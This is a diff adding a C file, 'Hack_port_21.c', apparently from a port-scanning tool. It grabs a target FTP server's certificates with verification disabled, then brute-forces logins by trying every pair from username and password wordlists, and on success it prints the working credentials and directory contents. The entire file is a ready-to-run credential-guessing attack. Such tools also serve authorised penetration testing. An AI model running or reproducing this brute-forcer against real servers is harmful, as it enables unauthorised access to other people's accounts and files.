@@ -1,0 +1,148 @@
+/*
+ ============================================================================
+ Name        : Hack_port_21.c
+ Author      : L.
+ Version     : 1.0.5
+ Copyright   : GNU General Public License v3.0
+ Description : Hack Port 21
+ ============================================================================
+ */
+
+#include "TCP_Syn_Port_Scanner.h"
+
+struct memory {
+	char *response;
+	size_t size;
+};
+
+static size_t callback(void *data, size_t size, size_t nmemb, void *userp){
+	size_t realsize = size * nmemb;
+	struct memory *mem = (struct memory *)userp;
+	char *ptr = realloc(mem->response, mem->size + realsize + 1);
+	if(ptr == NULL){
+		show_error("Out of Memory");
+		return -1;
+	}
+	mem->response = ptr;
+	memcpy(&(mem->response[mem->size]), data, realsize);
+	mem->size += realsize;
+	mem->response[mem->size] = 0;
+	return realsize;
+}
+
+int hack_port_21(in_addr_t ip, int port){
+	// CERT grabbing
+	printf("%s", HBLUE);
+	printf("\nTrying to obtain certs...\n\n");
+	printf("%s",BLUE);
+	CURL *mCurl2 = curl_easy_init();
+	char url[50]="";
+	snprintf(url,sizeof(url),"ftp://%s/",inet_ntoa(*((struct in_addr*)&dest_ip.s_addr)));
+	if(mCurl2) {
+		curl_easy_setopt(mCurl2, CURLOPT_URL, url);
+		curl_easy_setopt(mCurl2, CURLOPT_SSL_VERIFYPEER, 0L);
+		curl_easy_setopt(mCurl2, CURLOPT_SSL_VERIFYHOST, 0L);
+		curl_easy_setopt(mCurl2, CURLOPT_CERTINFO, 1L);
+		int res = curl_easy_perform(mCurl2);
+		if (!res) {
+			struct curl_certinfo *ci;
+			res = curl_easy_getinfo(mCurl2, CURLINFO_CERTINFO, &ci);
+			if (!res) {
+				printf("%d certs!\n", ci->num_of_certs);
+				for(int i = 0; i < ci->num_of_certs; i++) {
+					struct curl_slist *slist;
+					for(slist = ci->certinfo[i]; slist; slist = slist->next)
+						printf("%s\n", slist->data);
+				}
+			}else{
+				printf("%s\n",curl_easy_strerror(res));
+			}
+		}else{
+			printf("%s\n",curl_easy_strerror(res));
+		}
+		curl_easy_cleanup(mCurl2);
+	}
+	// Brute Force Attack
+	printf("%s", HBLUE);
+	printf("\nTrying to perform connections by using brute force...\n\n");
+	printf("%s",BLUE);
+	double totalComb=0, cont=0;
+	int i=0, timeouts=0;
+	FILE *f=NULL;
+	int totalUsernames=0;
+	if((totalUsernames=open_file("usernames.txt",&f))==-1){
+		show_error("Opening usernames.txt file error");
+		return -1;
+	}
+	char **usernames = (char**)malloc(totalUsernames * sizeof(char*));
+	for (i=0;i<totalUsernames;i++) usernames[i] = (char*)malloc(50 * sizeof(char));
+	i=0;
+	while(fscanf(f,"%s", usernames[i])!=EOF) i++;
+	int totalPasswords=0;
+	if((totalPasswords=open_file("p21_FTP_passwords.txt",&f))==-1){
+		show_error("Opening p21_FTP_passwords.txt file error");
+		return -1;
+	}
+	char **passwords = (char**)malloc(totalPasswords * sizeof(char*));
+	for (i=0;i<totalPasswords;i++) passwords[i] = (char*)malloc(50 * sizeof(char));
+	i=0;
+	while(fscanf(f,"%s", passwords[i])!=EOF) i++;
+	totalComb=totalUsernames*totalPasswords;
+	int abort=FALSE;
+	curl_global_init(CURL_GLOBAL_ALL);
+	CURLcode res;
+	char *ftpEntryPath=NULL;
+	struct memory chunk = {0};
+	CURL *mCurl=curl_easy_init();
+	if (mCurl){
+		for(i=0;i<totalUsernames && abort==FALSE;i++){
+			for(int j=0;j<totalPasswords && abort==FALSE;j++,cont++){
+				printf("\rPercentaje completed: %.4lf%% (%s/%s)               ",(double)((cont/totalComb)*100.0),usernames[i], passwords[j]);
+				fflush(stdout);
+				usleep(CURL_PERFORM_DELAY);
+				curl_easy_setopt(mCurl, CURLOPT_URL, url);
+				curl_easy_setopt(mCurl, CURLOPT_WRITEFUNCTION, callback);
+				curl_easy_setopt(mCurl, CURLOPT_WRITEDATA, (void *)&chunk);
+				curl_easy_setopt(mCurl, CURLOPT_TIMEOUT, 10L);
+				curl_easy_setopt(mCurl, CURLOPT_USERNAME, usernames[i]);
+				curl_easy_setopt(mCurl, CURLOPT_LOGIN_OPTIONS, "AUTH=*");
+				curl_easy_setopt(mCurl, CURLOPT_PASSWORD, passwords[j]);
+				res = curl_easy_perform(mCurl);
+				curl_easy_reset(mCurl);
+				if(res == CURLE_OK){
+					curl_easy_getinfo(mCurl, CURLINFO_FTP_ENTRY_PATH, &ftpEntryPath);
+					printf("%s",HRED);
+					printf("\n\nLoging successfull with user: %s, password: %s. Service Vulnerable\n\n",usernames[i], passwords[j]);
+					printf("Directory accessed: %s\n\n",ftpEntryPath);
+					printf("%s\n\n", chunk.response);
+					printf("%s",BLUE);
+				}else{
+					switch(res){
+					case 67:
+						break;
+					case 28:
+						timeouts++;
+						if(timeouts==BRUTE_FORCE_TIMEOUT){
+							printf("\nThird timeout. Aborting...\n");
+							abort=TRUE;
+							break;
+						}
+						printf("\nFirst timeout...\n");
+						break;
+					default:
+						printf("libcurl error: %d (%s)\n", res,curl_easy_strerror(res));
+						abort=TRUE;
+						break;
+					}
+				}
+			}
+		}
+	}else{
+		printf("Error curl initialization\n");
+	}
+	curl_easy_cleanup(mCurl);
+	curl_global_cleanup();
+	printf("\n");
+	printf("%s",DEFAULT);
+	return 0;
+}
